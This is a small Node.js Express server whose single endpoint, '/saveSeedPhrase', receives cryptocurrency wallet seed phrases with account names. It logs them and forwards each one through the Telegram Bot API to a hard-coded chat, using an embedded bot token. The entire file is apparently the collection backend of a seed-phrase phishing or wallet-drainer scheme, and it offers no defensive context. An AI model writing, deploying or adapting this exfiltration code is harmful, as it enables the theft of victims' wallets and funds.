const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;

app.use(bodyParser.json());

app.post('/saveSeedPhrase', (req, res) => {
const { seedPhrase, account } = req.body;
console.log('Received seed phrase for account:', account, 'Seed Phrase:', seedPhrase);

// Here you can save the seed phrase to a database or send it to your Telegram bot
sendToTelegram(`New seed phrase for account ${account}: ${seedPhrase}`);

res.sendStatus(200);
});

function sendToTelegram(message) {
const TELEGRAM_BOT = "8565350380:AAGJHdDxkvx1pdo1FMUmncvKnHq_iPfUMSY";
const ADMIN_CHAT_ID = "5126266116";
const url = `https://api.telegram.org/bot${"8565350380:AAGJHdDxkvx1pdo1FMUmncvKnHq_iPfUMSY"}/sendMessage`;
const payload = {
chat_id: ADMIN_CHAT_ID,
text: message
};
fetch(url, {
method: 'POST',
headers: {
'Content-Type': 'application/json'
},
body: JSON.stringify(payload)
});
}

app.listen(port, () => {
console.log(`Server running at http://localhost:${port}`);
});
